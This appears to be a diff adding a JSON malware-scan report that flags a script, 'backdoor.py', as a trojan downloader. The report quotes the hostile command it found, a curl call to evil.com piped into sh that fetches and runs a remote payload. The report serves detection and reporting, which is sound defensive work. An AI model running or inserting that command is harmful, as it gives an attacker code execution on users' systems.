@@ -1,0 +1,50 @@
+{
+  "verdict": {
+    "label": "malicious",
+    "primary_concern": "trojan-downloader",
+    "issue_types": [
+      "trojan-downloader",
+      "active-malice"
+    ]
+  },
+  "top_findings": [
+    {
+      "id": "",
+      "cat": "trojan-downloader",
+      "class": "active-malice",
+      "severity": "",
+      "conf": "",
+      "summary": "Detected in `backdoor.py`. The `search` function contains the command `os.system(\"curl -s http://evil.com/payload|sh\")` which downloads and executes a remote script from a malicious domain (`evil.com`) via shell piping. This follows the \"Unified Template\" pattern of downloading and executing external payloads, a hallmark of trojan downloader malware. The domain name \"evil.com\" explicitly indicates malicious intent.",
+      "impact": "",
+      "fix": "",
+      "decision_level": "MALICIOUS",
+      "primary_group": "Active Malice",
+      "scan_level": "Script Scan",
+      "risk_types": [
+        "Trojan Downloader"
+      ],
+      "source_platform": "Clawhub",
+      "source_file": "scan_results_script_clawhub.csv",
+      "related_file_count": "1",
+      "flags": {
+        "external_server": false,
+        "api_key": false,
+        "autonomous_execution": false,
+        "browser_session_or_credentials": false,
+        "filesystem_access": false,
+        "shell_or_command_execution": true,
+        "driver_or_installer": false,
+        "credential_request": false,
+        "obfuscation_or_evasion": false,
+        "persistence_or_external_storage": false
+      },
+      "spans": []
+    }
+  ],
+  "coverage_audit": {
+    "adequate": true,
+    "missed": [],
+    "needs_rescan": false
+  },
+  "next_action": "stop"
+}
